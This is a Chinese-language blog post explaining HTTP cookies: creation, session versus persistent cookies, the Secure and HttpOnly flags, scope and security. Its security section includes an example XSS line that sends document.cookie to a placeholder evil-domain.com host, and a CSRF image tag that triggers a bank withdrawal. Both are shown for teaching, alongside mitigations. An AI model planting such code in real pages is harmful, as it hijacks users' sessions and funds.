---
layout: post
title:  "Cookie 详解"
date:   2017-10-30 23:45:13 -0400
background: '/img/posts/05.jpg'
---

Cookie会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于[无状态](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless)的HTTP协议记录稳定的状态信息成为了可能。

Cookie主要用于以下三个方面：
*   会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
*   个性化设置（如用户自定义设置、主题等）
*   浏览器行为跟踪（如跟踪分析用户行为等）

Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie渐渐被淘汰。由于服务器指定Cookie后，浏览器的每次请求都会携带Cookie数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 [Web storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API "DOM Storage") （本地存储和会话存储）或 [IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API) 。

## 创建Cookie

当服务器收到HTTP请求时，服务器可以在响应头里面添加一个[`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie "响应首部 Set-Cookie 被用来由服务器端向客户端发送 cookie。")选项。浏览器收到响应后通常会保存下Cookie，之后对该服务器每一次请求中都通过[`Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie "Cookie 是一个请求首部，其中含有先前由服务器通过 Set-Cookie  首部投放并存储到客户端的 HTTP cookies。")请求头部将Cookie信息发送给服务器。另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

####会话期Cookie
会话期Cookie是最简单的Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（Expires）或者有效期（Max-Age）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie也会被保留下来，就好像浏览器从来没有关闭一样。

####持久性Cookie
和关闭浏览器便失效的会话期Cookie不同，持久性Cookie可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。
```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

### Cookie的`Secure` 和`HttpOnly` 标记

安全的Cookie只应通过HTTPS协议加密过的请求发送给服务端。即便设置了 `Secure` 标记，敏感信息也不应该通过Cookie传输，因为Cookie有其固有的不安全性，`Secure `标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（`http:`）无法使用Cookie的 `Secure` 标记。

为避免跨域脚本 ([XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS "XSS: Cross-site scripting (XSS) is a security exploit which allows an attacker to inject malicious client-side code into a website, which is then executed by the victims. The intent is to allow a person to bypass access controls and impersonate users. According to the Open Web Application Security Project, XSS is the third most common vulnerability in web applications for 2013.")) 攻击，通过JavaScript的 [`Document.cookie`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie "获取并设置与当前文档相关联的 cookie。若您需要一个通用的库，请查看简单的cookie框架。") API无法访问带有 `HttpOnly` 标记的Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 `HttpOnly` 标记。

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```
### Cookie的作用域

`Domain` 和 `Path` 标识定义了Cookie的*作用域：*即Cookie应该发送给哪些URL。

`Domain` 标识指定了哪些主机可以接受Cookie。如果不指定，默认为[当前文档的主机](https://developer.mozilla.org/en-US/docs/Web/API/Document/location)（**不包含子域名**）。如果指定了`Domain`，则一般包含子域名。

例如，如果设置 `Domain=mozilla.org`，则Cookie也包含在子域名中（如`developer.mozilla.org`）。

`Path` 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）。以字符 `%x2F` ("/") 作为路径分隔符，子路径也会被匹配。

## 删除Cookie
将cookie的过期时间设置为过去的时间可以删除该cookie，但是他不会删除带有`HttpOnly`的标记的cookie，如果设置了path或者domain参数，同样不能删除

### JavaScript通过Document.cookies访问Cookie

通过[`Document.cookie`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie "获取并设置与当前文档相关联的 cookie。若您需要一个通用的库，请查看简单的cookie框架。")属性可创建新的Cookie，也可通过该属性访问非`HttpOnly`标记的Cookie。

## 安全

当机器处于不安全环境时，切记*不能*通过HTTP Cookie存储、传输敏感信息。

### 会话劫持和XSS

在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行[XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS "XSS: Cross-site scripting (XSS) is a security exploit which allows an attacker to inject malicious client-side code into a website, which is then executed by the victims. The intent is to allow a person to bypass access controls and impersonate users. According to the Open Web Application Security Project, XSS is the third most common vulnerability in web applications for 2013.")攻击。

```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HttpOnly`类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。

### 跨站请求伪造（CSRF）

[维基百科](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery)已经给了一个比较好的[CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF "CSRF: CSRF (Cross-Site Request Forgery) is an attack that impersonates a trusted user and sends a website unwanted commands. This can be done, for example, by including malicious parameters in a URL behind a link that purports to go somewhere else.")例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：

```
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：

*   对用户输入进行过滤来阻止[XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS "XSS: Cross-site scripting (XSS) is a security exploit which allows an attacker to inject malicious client-side code into a website, which is then executed by the victims. The intent is to allow a person to bypass access controls and impersonate users. According to the Open Web Application Security Project, XSS is the third most common vulnerability in web applications for 2013.")；
*   任何敏感操作都需要确认；
*   用于敏感信息的Cookie只能拥有较短的生命周期；
*   更多方法可以查看[OWASP CSRF prevention cheat sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)。





